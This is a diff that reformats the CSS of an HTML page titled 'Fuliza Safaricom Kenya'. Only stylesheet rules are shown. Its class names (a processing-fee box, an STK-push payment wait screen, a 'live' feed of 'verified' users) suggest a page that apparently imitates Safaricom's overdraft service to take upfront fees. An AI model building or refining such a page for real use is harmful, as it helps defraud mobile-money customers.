@@ -1,1535 +1,1105 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Fuliza Safaricom Kenya</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         /* ── Reset & Base ── */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #0d5f2f;
-            color: #212529;
-            min-height: 100vh;
-            margin: 0;
-            padding: 0;
-        }
-        :root {
-            --primary: #0d5f2f;
-            --primary-dark: #073a1c;
-            --primary-light: #e8f5e9;
-            --gold: #c9a84c;
-            --gold-light: #f5edd6;
-            --red: #fa5252;
-            --gray: #f8f9fa;
-            --border: #ced4da;
-        }
-        .viewport-wrapper {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 16px 12px 60px;
-        }
-        .header-pill {
-            background: rgba(255, 255, 255, 0.12);
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            border-radius: 50px;
-            padding: 10px 24px;
-            color: white;
-            font-size: 0.85rem;
-            font-weight: 700;
-            margin: 8px 0 20px 0;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
-        }
-        .container {
-            width: 100%;
-            max-width: 440px;
-            background: #ffffff;
-            border-radius: 24px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-        }
-        .page {
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        .page.active {
-            display: block;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .card-content {
-            padding: 24px 20px;
-        }
-        .card-title {
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: #212529;
-            margin-bottom: 8px;
-            line-height: 1.3;
-            text-align: center;
-        }
-        .card-sub {
-            font-size: 0.8rem;
-            color: #6c757d;
-            margin-bottom: 24px;
-            text-align: center;
-            line-height: 1.4;
-        }
-        .form-row {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 14px;
-        }
-        .form-row>.form-group {
-            flex: 1;
-            margin-bottom: 0;
-        }
-        .form-group {
-            margin-bottom: 14px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 0.75rem;
-            font-weight: 700;
-            color: #212529;
-            margin-bottom: 6px;
-        }
-        .form-group label .required {
-            color: var(--red);
-            margin-left: 2px;
-        }
-        .input-wrapper {
-            position: relative;
-            width: 100%;
-        }
-        .input-wrapper input,
-        .input-wrapper select {
-            width: 100%;
-            height: 48px;
-            padding: 0 36px 0 12px;
-            border: 1.5px solid #a5b4fc;
-            border-radius: 10px;
-            font-family: inherit;
-            font-size: 0.95rem;
-            background: white;
-            outline: none;
-            transition: all 0.2s ease;
-            color: #212529;
-        }
-        .input-wrapper input::placeholder {
-            color: #adb5bd;
-        }
-        .input-wrapper input:focus,
-        .input-wrapper select:focus {
-            border-color: #0e6231;
-            box-shadow: 0 0 0 3px rgba(14, 98, 49, 0.1);
-        }
-        .status-icon {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            pointer-events: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 20px;
-            height: 20px;
-            font-weight: 800;
-        }
-        .input-wrapper.valid input,
-        .input-wrapper.valid select {
-            border-color: #0ca678;
-        }
-        .input-wrapper.valid .status-icon::after {
-            content: "✓";
-            color: #0ca678;
-            font-size: 1.2rem;
-        }
-        .input-wrapper.invalid input,
-        .input-wrapper.invalid select {
-            border-color: var(--red);
-            background-color: #fff5f5;
-        }
-        .input-wrapper.invalid .status-icon::after {
-            content: "✕";
-            color: var(--red);
-            font-size: 1rem;
-        }
-        .error-msg {
-            color: var(--red);
-            font-size: 0.72rem;
-            margin-top: 4px;
-            display: none;
-            font-weight: 500;
-        }
-        .input-wrapper.invalid+.error-msg {
-            display: block;
-        }
-        .btn-primary {
-            width: 100%;
-            height: 52px;
-            background: #1b49b5;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 10px;
-        }
-        .btn-primary:hover {
-            background: #123485;
-        }
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        .btn-outline {
-            background: transparent;
-            border: 1.5px solid #1b49b5;
-            color: #1b49b5;
-            border-radius: 10px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-            padding: 14px;
-        }
-        .btn-outline:hover {
-            background: #f0f4ff;
-        }
-        .btn-green {
-            background: #0d5f2f;
-        }
-        .btn-green:hover {
-            background: #073a1c;
-        }
-        .btn-red {
-            background: #c62828;
-        }
-        .btn-red:hover {
-            background: #a32020;
-        }
-        .btn-gold {
-            background: var(--gold);
-            color: #ffffff;
-        }
-        .btn-gold:hover {
-            background: #b5943c;
-        }
-        .approved-badge-card {
-            background: #e9ecef;
-            border-radius: 8px;
-            padding: 12px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin-top: 20px;
-            font-weight: 700;
-            font-size: 0.72rem;
-            color: #495057;
-            text-align: center;
-            letter-spacing: 0.3px;
-        }
-        .approved-badge-card .flag-below {
-            margin-top: 4px;
-            font-size: 1.1rem;
-        }
-        .card-header-green {
-            background: linear-gradient(135deg, #1a7a3a, #0c5225);
-            color: #ffffff;
-            padding: 24px 20px;
-            border-radius: 24px 24px 0 0;
-        }
-        .card-header-green .step-info {
-            font-size: 0.72rem;
-            opacity: 0.9;
-            font-weight: 600;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .card-header-green .step-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
-        .card-header-green .step-sub {
-            font-size: 0.85rem;
-            opacity: 0.9;
-            line-height: 1.4;
-        }
-        .card-body-white {
-            padding: 20px;
-            background: #ffffff;
-        }
-        .card-header-red {
-            background: #c62828;
-            color: #ffffff;
-            padding: 24px 20px;
-            border-radius: 24px 24px 0 0;
-        }
-        .card-header-gold {
-            background: linear-gradient(135deg, #c9a84c, #b5943c);
-            color: #ffffff;
-            padding: 24px 20px;
-            border-radius: 24px 24px 0 0;
-        }
-        .card-header-gold .step-info {
-            font-size: 0.72rem;
-            opacity: 0.9;
-            font-weight: 600;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .card-header-gold .step-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
-        .card-header-gold .step-sub {
-            font-size: 0.85rem;
-            opacity: 0.9;
-            line-height: 1.4;
-        }
-        .check-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 14px 16px;
-            border: 1.5px solid #eef2f6;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            transition: all 0.3s ease;
-            background: #ffffff;
-            text-align: left;
-        }
-        .check-item.pending {
-            border-style: dashed;
-            opacity: 0.55;
-        }
-        .check-item.active {
-            border-color: #1b49b5;
-            border-style: dashed;
-            background: #f0f4ff;
-        }
-        .check-item.completed {
-            border-color: #c3e6cb;
-            background: #f4faf6;
-            color: #155724;
-            font-weight: 600;
-        }
-        .check-circle {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            border: 2px solid #ced4da;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            font-weight: bold;
-            font-size: 0.8rem;
-            position: relative;
-        }
-        .check-item.active .check-circle {
-            border-color: #1b49b5;
-            border-top-color: transparent;
-            animation: spin 0.8s linear infinite;
-        }
-        .check-item.completed .check-circle {
-            background: #28a745;
-            border-color: #28a745;
-            color: white;
-        }
-        .check-item.completed .check-circle::after {
-            content: "✓";
-        }
-        .eligibility-spinner {
-            width: 80px;
-            height: 80px;
-            border: 6px solid #eef2f6;
-            border-top-color: #1b49b5;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 16px auto 24px;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .proc-modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.45);
-            backdrop-filter: blur(4px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 3000;
-            padding: 16px;
-        }
-        .proc-modal-overlay.open {
-            display: flex;
-        }
-        .proc-modal-box {
-            background: #ffffff;
-            border-radius: 20px;
-            width: 100%;
-            max-width: 480px;
-            padding: 24px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
-            display: grid;
-            grid-template-columns: 1.25fr 1fr;
-            gap: 20px;
-            text-align: left;
-            align-items: center;
-        }
-        @media (max-width: 420px) {
-            .proc-modal-box {
-                grid-template-columns: 1fr;
-                gap: 16px;
-                text-align: center;
-            }
-        }
-        .proc-left {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        .proc-header {
-            display: flex;
-            gap: 12px;
-            align-items: flex-start;
-        }
-        @media (max-width: 420px) {
-            .proc-header {
-                justify-content: center;
-            }
-        }
-        .proc-badge {
-            background: #0d5f2f;
-            color: white;
-            font-weight: 800;
-            font-size: 0.65rem;
-            padding: 12px 6px;
-            border-radius: 6px;
-            text-align: center;
-            min-width: 60px;
-            line-height: 1.1;
-            letter-spacing: 0.5px;
-        }
-        .proc-title-block {
-            font-size: 0.65rem;
-            font-weight: 700;
-            color: #1e3a8a;
-            line-height: 1.3;
-            text-align: left;
-        }
-        .proc-title-block strong {
-            font-size: 0.85rem;
-            display: block;
-            margin-top: 1px;
-            letter-spacing: 0.3px;
-        }
-        .proc-status-text {
-            font-weight: 700;
-            font-size: 0.85rem;
-            color: #212529;
-            margin-top: 4px;
-        }
-        .proc-dots {
-            display: flex;
-            gap: 6px;
-            margin-top: 2px;
-        }
-        @media (max-width: 420px) {
-            .proc-dots {
-                justify-content: center;
-                margin-bottom: 8px;
-            }
-        }
-        .proc-dots span {
-            width: 8px;
-            height: 8px;
-            background-color: #3b82f6;
-            border-radius: 50%;
-            animation: procDotPulse 1.2s infinite ease-in-out both;
-        }
-        .proc-dots span:nth-child(1) {
-            animation-delay: -0.32s;
-        }
-        .proc-dots span:nth-child(2) {
-            animation-delay: -0.16s;
-        }
-        @keyframes procDotPulse {
-            0%,
-            80%,
-            100% {
-                transform: scale(0);
-            }
-            40% {
-                transform: scale(1);
-            }
-        }
-        .proc-right {
-            font-size: 0.72rem;
-            color: #6c757d;
-            line-height: 1.45;
-            border-left: 1px solid #e9ecef;
-            padding-left: 20px;
-            text-align: left;
-        }
-        @media (max-width: 420px) {
-            .proc-right {
-                border-left: none;
-                padding-left: 0;
-                border-top: 1px solid #e9ecef;
-                padding-top: 16px;
-                text-align: center;
-            }
-        }
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(4px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 3000;
-            padding: 20px;
-        }
-        .modal-overlay.open {
-            display: flex;
-        }
-        .modal-box {
-            background: white;
-            border-radius: 20px;
-            padding: 28px 24px;
-            width: 100%;
-            max-width: 400px;
-            animation: modalIn 0.25s ease;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
-        }
-        @keyframes modalIn {
-            from {
-                opacity: 0;
-                transform: scale(0.95) translateY(16px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-        .modal-icon {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
-            font-size: 1.6rem;
-        }
-        .modal-icon.success {
-            background: #e8f5e9;
-            color: var(--primary);
-        }
-        .modal-icon.error {
-            background: #fce4ec;
-            color: var(--red);
-        }
-        .modal-icon.warning {
-            background: #fff3e0;
-            color: #e65100;
-        }
-        .modal-title {
-            font-size: 1.25rem;
-            font-weight: 800;
-            margin-bottom: 6px;
-        }
-        .modal-desc {
-            font-size: 0.85rem;
-            color: #6c757d;
-            margin-bottom: 16px;
-            line-height: 1.45;
-        }
-        .modal-phone-group {
-            display: flex;
-            border: 1.5px solid var(--border);
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 8px 0 12px;
-        }
-        .modal-phone-group .prefix {
-            background: var(--gray);
-            padding: 12px 14px;
-            font-weight: 600;
-            border-right: 1.5px solid var(--border);
-            color: #333;
-            display: flex;
-            align-items: center;
-        }
-        .modal-phone-group input {
-            flex: 1;
-            border: none;
-            padding: 12px 14px;
-            font-family: inherit;
-            font-size: 0.95rem;
-            outline: none;
-        }
-        .modal-status {
-            font-size: 0.75rem;
-            padding: 8px 12px;
-            border-radius: 8px;
-            margin: 10px 0;
-            display: none;
-            font-weight: 500;
-            line-height: 1.3;
-        }
-        .modal-status.show {
-            display: block;
-        }
-        .modal-status.pending {
-            background: #fff8e1;
-            color: #e65100;
-        }
-        .modal-status.success {
-            background: #e8f5e9;
-            color: #0ca678;
-        }
-        .modal-status.error {
-            background: #fce4ec;
-            color: var(--red);
-        }
-        .feed-container {
-            max-height: 220px;
-            overflow-y: auto;
-            padding-right: 4px;
-        }
-        .feed-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            padding: 10px 12px;
-            border-bottom: 1px solid #f0f0f0;
-            animation: slideIn 0.3s ease;
-            text-align: left;
-        }
-        .feed-item:last-child {
-            border-bottom: none;
-        }
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateX(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: none;
-            }
-        }
-        .feed-avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 0.8rem;
-            color: white;
-            flex-shrink: 0;
-        }
-        .feed-content {
-            flex: 1;
-        }
-        .feed-name {
-            font-weight: 700;
-            font-size: 0.85rem;
-            color: #212529;
-        }
-        .feed-name .verified {
-            color: #0ca678;
-            font-size: 0.65rem;
-            margin-left: 4px;
-            font-weight: 600;
-        }
-        .feed-text {
-            font-size: 0.8rem;
-            color: #495057;
-            margin-top: 2px;
-            line-height: 1.35;
-        }
-        .feed-time {
-            font-size: 0.65rem;
-            color: #868e96;
-            margin-top: 2px;
-        }
-        .feed-live {
-            display: inline-block;
-            background: var(--red);
-            color: white;
-            font-size: 0.55rem;
-            font-weight: 800;
-            padding: 2px 8px;
-            border-radius: 10px;
-            animation: pulse 1.5s infinite;
-            letter-spacing: 0.3px;
-        }
-        @keyframes pulse {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.5;
-            }
-        }
-        .nav-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 12px;
-        }
-        .back-btn {
-            background: none;
-            border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: #ffffff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            transition: background 0.2s;
-        }
-        .back-btn:hover {
-            background: rgba(255, 255, 255, 0.15);
-        }
-        .footer {
-            text-align: center;
-            padding: 20px 16px 0;
-            font-size: 0.65rem;
-            color: rgba(255, 255, 255, 0.65);
-            line-height: 1.5;
-            max-width: 440px;
-            width: 100%;
-        }
-
-        /* ── TOAST: kept as no‑op ── */
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #212529;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 12px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            z-index: 4000;
-            display: none;
-            max-width: 90%;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-        }
-        .toast.show {
-            display: block;
-            animation: slideUp 0.3s ease;
-        }
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        .spinner {
-            width: 18px;
-            height: 18px;
-            border: 2px solid #e0e0e0;
-            border-top-color: #ffffff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
-        }
-
-        /* ── STK Waiting Overlay ── */
-        .stk-waiting-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 5000;
-            padding: 20px;
-        }
-        .stk-waiting-overlay.open {
-            display: flex;
-        }
-        .stk-waiting-box {
-            background: white;
-            border-radius: 24px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            animation: fadeIn 0.3s ease;
-        }
-        .stk-waiting-box .pulse-icon {
-            width: 72px;
-            height: 72px;
-            border: 6px solid #e0e0e0;
-            border-top-color: #0d5f2f;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        .stk-waiting-box .title {
-            font-size: 1.2rem;
-            font-weight: 800;
-            color: #1b49b5;
-            margin-bottom: 8px;
-        }
-        .stk-waiting-box .sub {
-            font-size: 0.9rem;
-            color: #333;
-            margin-bottom: 6px;
-        }
-        .stk-waiting-box .phone {
-            font-weight: 700;
-            color: #0d5f2f;
-        }
-        .stk-waiting-box .dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 20px 0;
-        }
-        .stk-waiting-box .dots span {
-            width: 10px;
-            height: 10px;
-            background: #1b49b5;
-            border-radius: 50%;
-            animation: procDotPulse 1.2s infinite ease-in-out both;
-        }
-        .stk-waiting-box .dots span:nth-child(1) {
-            animation-delay: -0.32s;
-        }
-        .stk-waiting-box .dots span:nth-child(2) {
-            animation-delay: -0.16s;
-        }
-        .stk-waiting-box .listening {
-            background: #e8f5e9;
-            border-radius: 24px;
-            padding: 8px 16px;
-            font-size: 0.78rem;
-            color: #0d5f2f;
-            font-weight: 700;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .stk-waiting-box .listening .dot {
-            width: 8px;
-            height: 8px;
-            background: #0ca678;
-            border-radius: 50%;
-            display: inline-block;
-            animation: pulse 1.5s infinite;
-        }
-        .stk-waiting-box .note {
-            font-size: 0.68rem;
-            color: #adb5bd;
-            margin-top: 14px;
-        }
-
-        /* ── Processing Fee Confirmed Overlay ── */
-        #processingFeeConfirmedOverlay .modal-box .big-check {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, #0d5f2f, #0ca678);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            margin: 0 auto 16px;
-            color: white;
-        }
-        #processingFeeConfirmedOverlay .modal-box .title {
-            font-size: 1.3rem;
-            font-weight: 900;
-            color: #0d5f2f;
-            margin-bottom: 8px;
-        }
-        #processingFeeConfirmedOverlay .modal-box .sub {
-            font-size: 0.88rem;
-            color: #495057;
-        }
-        #processingFeeConfirmedOverlay .modal-box .receipt {
-            font-size: 0.78rem;
-            color: #6c757d;
-        }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 20px 0;
-        }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots span {
-            width: 10px;
-            height: 10px;
-            background: #0d5f2f;
-            border-radius: 50%;
-            animation: procDotPulse 1.2s infinite ease-in-out both;
-        }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots span:nth-child(1) {
-            animation-delay: -0.32s;
-        }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots span:nth-child(2) {
-            animation-delay: -0.16s;
-        }
-
-        .fee-section {
-            background: #f5edd6;
-            border: 2px solid #c9a84c;
-            border-radius: 12px;
-            padding: 16px 18px;
-            margin: 16px 0;
-            text-align: center;
-        }
-        .fee-section .fee-label {
-            font-size: 0.72rem;
-            color: #666;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .fee-section .fee-amount {
-            font-size: 2rem;
-            font-weight: 900;
-            color: #b85c00;
-            margin: 4px 0;
-        }
-        .fee-section .fee-sub {
-            font-size: 0.75rem;
-            color: #555;
-            font-weight: 500;
-        }
-
-        .success-summary {
-            background: #f0faf4;
-            border: 1px solid #b2dfdb;
-            border-radius: 12px;
-            padding: 14px;
-            margin: 16px 0;
-            text-align: left;
-            font-size: 0.82rem;
-        }
-        .success-summary .summary-title {
-            font-weight: 800;
-            color: #0d5f2f;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-        }
-        .success-summary .summary-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 6px;
-        }
-        .success-summary .summary-row:last-child {
-            margin-bottom: 0;
-        }
-        .success-summary .summary-row .label {
-            color: #6c757d;
-        }
-        .success-summary .summary-row .value {
-            font-weight: 700;
-            color: #212529;
-        }
-        .success-summary .summary-row .value.amount {
-            color: #0d5f2f;
-        }
-        .success-summary .summary-row .value.network {
-            color: #0d5f2f;
-        }
-
-        .sending-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.82rem;
-            color: #0ca678;
-            font-weight: 700;
-            margin-bottom: 12px;
-            justify-content: center;
-            width: 100%;
-        }
-        .sending-indicator .dot {
-            width: 10px;
-            height: 10px;
-            background: #0ca678;
-            border-radius: 50%;
-            display: inline-block;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d5f2f; color: #212529; min-height: 100vh; margin: 0; padding: 0; }
+        :root { --primary: #0d5f2f; --primary-dark: #073a1c; --primary-light: #e8f5e9; --gold: #c9a84c; --gold-light: #f5edd6; --red: #fa5252; --gray: #f8f9fa; --border: #ced4da; }
+        .viewport-wrapper { width: 100%; display: flex; flex-direction: column; align-items: center; padding: 16px 12px 60px; }
+        .header-pill { background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.25); border-radius: 50px; padding: 10px 24px; color: white; font-size: 0.85rem; font-weight: 700; margin: 8px 0 20px 0; display: inline-flex; align-items: center; justify-content: center; gap: 8px; letter-spacing: 0.5px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .container { width: 100%; max-width: 440px; background: #ffffff; border-radius: 24px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .page { display: none; animation: fadeIn 0.3s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+        .card-content { padding: 24px 20px; }
+        .card-title { font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px; line-height: 1.3; text-align: center; }
+        .card-sub { font-size: 0.8rem; color: #6c757d; margin-bottom: 24px; text-align: center; line-height: 1.4; }
+        .form-row { display: flex; gap: 12px; margin-bottom: 14px; }
+        .form-row > .form-group { flex: 1; margin-bottom: 0; }
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #212529; margin-bottom: 6px; }
+        .form-group label .required { color: var(--red); margin-left: 2px; }
+        .input-wrapper { position: relative; width: 100%; }
+        .input-wrapper input, .input-wrapper select { width: 100%; height: 48px; padding: 0 36px 0 12px; border: 1.5px solid #a5b4fc; border-radius: 10px; font-family: inherit; font-size: 0.95rem; background: white; outline: none; transition: all 0.2s ease; color: #212529; }
+        .input-wrapper input::placeholder { color: #adb5bd; }
+        .input-wrapper input:focus, .input-wrapper select:focus { border-color: #0e6231; box-shadow: 0 0 0 3px rgba(14,98,49,0.1); }
+        .status-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); pointer-events: none; display: flex; align-items: center; justify-content: center; width: 20px; height: 20px; font-weight: 800; }
+        .input-wrapper.valid input, .input-wrapper.valid select { border-color: #0ca678; }
+        .input-wrapper.valid .status-icon::after { content: "✓"; color: #0ca678; font-size: 1.2rem; }
+        .input-wrapper.invalid input, .input-wrapper.invalid select { border-color: var(--red); background-color: #fff5f5; }
+        .input-wrapper.invalid .status-icon::after { content: "✕"; color: var(--red); font-size: 1rem; }
+        .error-msg { color: var(--red); font-size: 0.72rem; margin-top: 4px; display: none; font-weight: 500; }
+        .input-wrapper.invalid + .error-msg { display: block; }
+        .btn-primary { width: 100%; height: 52px; background: #1b49b5; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; }
+        .btn-primary:hover { background: #123485; }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-outline { background: transparent; border: 1.5px solid #1b49b5; color: #1b49b5; border-radius: 10px; font-weight: 700; cursor: pointer; transition: all 0.2s; padding: 14px; }
+        .btn-outline:hover { background: #f0f4ff; }
+        .btn-green { background: #0d5f2f; }
+        .btn-green:hover { background: #073a1c; }
+        .btn-red { background: #c62828; }
+        .btn-red:hover { background: #a32020; }
+        .btn-gold { background: var(--gold); color: #ffffff; }
+        .btn-gold:hover { background: #b5943c; }
+        .approved-badge-card { background: #e9ecef; border-radius: 8px; padding: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 20px; font-weight: 700; font-size: 0.72rem; color: #495057; text-align: center; letter-spacing: 0.3px; }
+        .approved-badge-card .flag-below { margin-top: 4px; font-size: 1.1rem; }
+        .card-header-green { background: linear-gradient(135deg, #1a7a3a, #0c5225); color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
+        .card-header-green .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-header-green .step-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
+        .card-header-green .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
+        .card-body-white { padding: 20px; background: #ffffff; }
+        .card-header-red { background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
+        .card-header-gold { background: linear-gradient(135deg, #c9a84c, #b5943c); color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
+        .card-header-gold .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-header-gold .step-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
+        .card-header-gold .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
+        .check-item { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border: 1.5px solid #eef2f6; border-radius: 12px; margin-bottom: 10px; transition: all 0.3s ease; background: #ffffff; text-align: left; }
+        .check-item.pending { border-style: dashed; opacity: 0.55; }
+        .check-item.active { border-color: #1b49b5; border-style: dashed; background: #f0f4ff; }
+        .check-item.completed { border-color: #c3e6cb; background: #f4faf6; color: #155724; font-weight: 600; }
+        .check-circle { width: 24px; height: 24px; border-radius: 50%; border: 2px solid #ced4da; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: bold; font-size: 0.8rem; position: relative; }
+        .check-item.active .check-circle { border-color: #1b49b5; border-top-color: transparent; animation: spin 0.8s linear infinite; }
+        .check-item.completed .check-circle { background: #28a745; border-color: #28a745; color: white; }
+        .check-item.completed .check-circle::after { content: "✓"; }
+        .eligibility-spinner { width: 80px; height: 80px; border: 6px solid #eef2f6; border-top-color: #1b49b5; border-radius: 50%; animation: spin 1s linear infinite; margin: 16px auto 24px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .proc-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 16px; }
+        .proc-modal-overlay.open { display: flex; }
+        .proc-modal-box { background: #ffffff; border-radius: 20px; width: 100%; max-width: 480px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); display: grid; grid-template-columns: 1.25fr 1fr; gap: 20px; text-align: left; align-items: center; }
+        @media (max-width: 420px) { .proc-modal-box { grid-template-columns: 1fr; gap: 16px; text-align: center; } }
+        .proc-left { display: flex; flex-direction: column; gap: 12px; }
+        .proc-header { display: flex; gap: 12px; align-items: flex-start; }
+        @media (max-width: 420px) { .proc-header { justify-content: center; } }
+        .proc-badge { background: #0d5f2f; color: white; font-weight: 800; font-size: 0.65rem; padding: 12px 6px; border-radius: 6px; text-align: center; min-width: 60px; line-height: 1.1; letter-spacing: 0.5px; }
+        .proc-title-block { font-size: 0.65rem; font-weight: 700; color: #1e3a8a; line-height: 1.3; text-align: left; }
+        .proc-title-block strong { font-size: 0.85rem; display: block; margin-top: 1px; letter-spacing: 0.3px; }
